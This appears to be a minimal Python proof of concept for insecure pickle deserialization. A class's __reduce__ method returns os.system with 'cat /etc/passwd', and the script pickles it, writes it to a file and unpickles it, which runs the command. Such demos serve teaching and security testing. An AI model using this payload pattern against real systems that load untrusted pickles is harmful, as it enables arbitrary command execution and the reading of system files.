import os
import pickle


class Pickle():
    def __reduce__(selfself):
        return (os.system, ('cat /etc/passwd',))

data = pickle.dumps(Pickle())
print(data)

with open("pickle.data","wb") as file:
    file.write(data)


with open("pickle.data","rb") as file:
    pickled_data = file.read()
    output = pickle.loads(pickled_data)
